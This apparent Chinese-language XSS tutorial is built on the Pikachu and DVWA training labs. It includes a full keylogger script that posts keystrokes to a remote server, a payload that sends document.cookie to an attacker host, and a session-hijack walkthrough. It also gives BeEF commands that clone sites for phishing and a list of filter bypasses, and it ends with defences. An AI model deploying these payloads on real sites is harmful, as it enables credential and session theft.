---
slug: /net-security/07/01
---

## 基本概念

跨站脚本攻击（Cross Site Scripting），简称 XSS（避免和 CSS 冲突），原理是接受了恶意脚本（输入），并在客户端执行了该恶意脚本（输出）。



## 分类

### 反射型

URL 上包含恶意脚本代码，受害者打开该 URL，恶意脚本代码被执行。

比如：`http://YOUR_IP_ADDRESS:8080/vulnerabilities/xss_r/?name=world<script>console.log('world')</script>#`

`name` 上包含了恶意脚本代码，当打开该链接，会在控制台输出 `world`：

![](http://img.wukaipeng.com/2023/1015-111434-image-20231015111434122.png)



>  除了用 `<script>` ，我们还可以利用**事件**，比如 `<img>` 加载图片失败时触发 `onerror` 事件。
>
> 🌰 举例， `<img src=## onerror="alert(document.cookie)" />`，将用户的 cookie 显示出来：
>
> ![](http://img.wukaipeng.com/2023/1015-114012-image-20231015114012218.png)



### 存储型

反射型不会被存储下来，接下来我们来看存储型的：

我们在 XSS（Stored）菜单项，注册 `name` 为 `zhangsan`，`message` 为 `🤡 <script>console.log('hello world')</script>` 的 Guestbook。

现在无论任何用户访问 XSS（Stored）菜单项，都会执行该恶意脚本代码：

![](http://img.wukaipeng.com/2023/1015-111737-image-20231015111737024.png)



### DOM 型

反射型的一种， 在客户端直接执行 DOM。

## 盲打

XSS 盲打，属于存储型的一种，攻击者并不知道恶意代码具体会在哪里执行。比如攻击者任意填写一个表单，但当后台管理人员打开表单管理，恶意代码被执行。

在 Pikachu 平台的 Cross-Site Scripting » XSS 之盲打菜单项下，攻击者提交恶意脚本代码：

![](http://img.wukaipeng.com/2023/1015-135414-image-20231015135414216.png)

当受害者登录后台：`http://YOUR_IP_ADDRESS:8081/vul/xss/xssblind/admin_login.php`（账号密码为：`admin/123456`）

可以看到我们的恶意脚本代码已经被执行了：

![](http://img.wukaipeng.com/2023/1015-135749-image-20231015135749281.png)

## 键盘记录

键盘记录是存储型的一种，将用户的键盘输入记录下来。

Pikachu 平台已经为我们提供了可用的键盘记录恶意脚本代码  `/var/www/html/pkxss/rkeypress/rk.js`：

```php
/**
 * Created by runner on 2018/7/8.
 */

function createAjax(){
    var request=false;
    if(window.XMLHttpRequest){
        request=new XMLHttpRequest();
        if(request.overrideMimeType){
            request.overrideMimeType("text/xml");
        }

    }else if(window.ActiveXObject){

        var versions=['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
        for(var i=0; i<versions.length; i++){
            try{
                request=new ActiveXObject(versions[i]);
                if(request){
                    return request;
                }
            }catch(e){
                request=false;
            }
        }
    }
    return request;
}

var ajax=null;
var xl="datax=";

function onkeypress() {
    var realkey = String.fromCharCode(event.keyCode);
    xl+=realkey;
    show();
}

document.onkeypress = onkeypress;

function show() {
    ajax = createAjax();
    ajax.onreadystatechange = function () {
        if (ajax.readyState == 4) {
            if (ajax.status == 200) {
                var data = ajax.responseText;
            } else {
                alert("页面请求失败");
            }
        }
    }

    var postdate = xl;
    ajax.open("POST", "http://192.168.1.15/pkxss/rkeypress/rkserver.php",true);
    ajax.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    ajax.setRequestHeader("Content-length", postdate.length);
    ajax.setRequestHeader("Connection", "close");
    ajax.send(postdate);
```



在 54 行处，我们需要把 `http://192.168.1.15/pkxss/rkeypress/rkserver.php` 改为自己的 Pikachu 平台地址：

`http://YOUR_IP_ADDRESS:PORT/pkxss/rkeypress/rkserver.php`，这个脚本是用于存储键盘输入。

然后写到：`<script src="http://YOUR_IP_ADDRESS:PORT/pkxss/rkeypress/rk.js"></script>`

![](http://img.wukaipeng.com/2023/1015-142720-image-20231015142720582.png)

然后进入 Pikachu 平台的 管理工具 » XSS 后台，然后查看「键盘记录」，现在只要存储型XSS 的留言板有键盘输入，就能够捕捉到：

![](http://img.wukaipeng.com/2023/1015-142945-image-20231015142945411.png)

## 平台利用



### 获取 Cookie

Pikachu 平台已经为我们提供了收集 Cookie 的脚本：`<script>document.write('<img src="http://YOUR_IP_ADDRESS:PORT/pkxss/xcookie/cookie.php? cookie='+document.cookie+'"/>')</script>`

![](http://img.wukaipeng.com/2023/1015-153622-image-20231015153622001.png)

模拟受害者登录后台，恶意代码被执行：

![](http://img.wukaipeng.com/2023/1015-153703-image-20231015153702933.png)

此时攻击者在后台看到 cookie 已经被收集上来了：

![](http://img.wukaipeng.com/2023/1015-153756-image-20231015153756287.png)

现在攻击者已经拿到 Cookie 了，那么就可以登录 Admin 端了，在另外的浏览器进入地址：`http://YOUR_IP_ADDRESS:PORT/vul/xss/xssblind/admin_login.php`

通过 Cookie Editor 这样的插件，攻击者把获取得到的 Cookie，包括 `ant[pw]`， `ant[uname]`，`PHPSESSID`， `security` 填写上去：

![](http://img.wukaipeng.com/2023/1015-161019-image-20231015161019465.png)

接着在地址栏再输入 `http://YOUR_IP_ADDRESS:PORT/vul/xss/xssblind/admin.php`，可以看到不会被重定向到 `../admin_login.php` 页面了，而是直接登录成功

![](http://img.wukaipeng.com/2023/1015-161323-image-20231015161323359.png)

> 🧐 如何防范？  
>
> - 单点登录。一个账号只允许一个 IP 登录
> - IP 记录。记录所有登录的 IP 地址。



### BeEF

👉 安装见：[02-MacOS M1M2 安装 Kali 和 BeEF 踩坑](https://wukaipeng.com/technique/net-security/07/02)

#### 克隆任意网站

```bash
➜  ~ curl -H "Content-Type: application/json; charset=UTF-8"  \
  -d '{"url": "https://wukaipeng.com/", "mount": "/is-wukaipeng"}' \
  -X POST \
http://192.168.64.4:3000/api/seng/clone_page\?token\=44738d265d43e98903df4f7b0821b4289dae1bc1
{"success":true,"mount":"/is-wukaipeng"}%
```

`-d` 中，`url` 是克隆的目标网站，`mount` 是克隆之后的地址

`POST` 的目标地址是 BeEF 的地址，token 来自与 API Key，见下图：

 ![](http://img.wukaipeng.com/2023/1016-212812-image-20231016212812263.png)

克隆之后的效果：

![](http://img.wukaipeng.com/2023/1016-212558-image-20231016212558649.png)

#### 克隆钓鱼网站并获取用户账号密码

克隆 Pikachu » Cross-Site Scripting » 反射型 XSS（post）页面：

```
curl -H "Content-Type: application/json; charset=UTF-8"  \
  -d '{"url": "http://175.178.126.31:8081/vul/xss/xsspost/post_login.php", "mount": "/pikachu"}' \
  -X POST \
http://192.168.64.4:3000/api/seng/clone_page?token=44738d265d43e98903df4f7b0821b4289dae1bc1
```

![](http://img.wukaipeng.com/2023/1016-213332-image-20231016213332776.png)

在 BeEF 后台可以看到已经有其他用户上线该网站了：

![](http://img.wukaipeng.com/2023/1016-213532-image-20231016213532316.png)

当用户输入账号密码后，我们也能通过 Logs 查看得到：

![](http://img.wukaipeng.com/2023/1016-213903-image-20231016213903055.png)



## 防御绕过

### 过滤不严格

这种方式可以采用以下方式绕过：

1. 大小写，比如 `<ScRiPt>`
2. 双写，比如 `<scr<script>ipt>`
3. 使用事件，比如

### HTML 实体编码

`&` 👉 ` &amp;`
`"` 👉 `&quot;`
`'` 👉 `&#039;`
`<` 👉  `&lt;`
`>` 👉 `&gt;`

在 Pikachu 平台上的 Cross-Site Scripting » xss 之 htmlspecialchars 菜单项中，添加 `abc` ，可以看到它作为 `<a>` 标签的 `href` 属性：

![](http://img.wukaipeng.com/2023/1015-193445-image-20231015193444939.png)

当我们输入 `' " < >` 进行测试，发现只有单引号没有被转义：

![](http://img.wukaipeng.com/2023/1015-194055-image-20231015194055513.png)

那么可以利用单引号构建恶意脚本代码 `#' onclick='alert(document.cookie)`：

![](http://img.wukaipeng.com/2023/1015-194315-image-20231015194314876.png)

## 防御

根据 XSS 原理，分别从输入和输出两侧去做防御，根本手段是采用过滤、转义。

### 输入

输入端必须要在服务端处理，但目前 Web 前后端都会做处理。

过滤常见字符：

1. `|`（竖线符号）
2. `&` （& 符号）
3. `;`（分号）
4. `$`（美元符号）
5. `%`（百分比符号）
6. `@`（at 符号）
7. `'`（单引号）
8. `"`（引号）
9. `\'`（反斜杠转义单引号）
10. `\"`（反斜杠转义引号）
11. `<>`（尖括号）
12. `()`（括号）
13. `+`（加号）
14. `CR`（回车符，ASCII 0x0d）
15. `LF`（换行，ASCII 0x0a）
16. `,`（逗号）
17. `\`（反斜杠）

### 输出

1. HTML 编码

`&` 👉 ` &amp;`
`"` 👉 `&quot;`
`'` 👉 `&#039;`
`<` 👉  `&lt;`
`>` 👉 `&gt;`

2. JavaScript 编码

`\` 👉 `\\`
`/` 👉 `\/`
`;` 👉 `；(全角;)`




### HttpOnly

Cookie 设置 `HttpOnly` 后，该 Cookie 只能发起请求的时候才能被使用，无法通过 `document.cookie` 脚本代码访问。

> 严格来说，`HttpOnly` 并非防止 XSS 攻击，而是防止 XSS 攻击后的 Cookie 劫持。















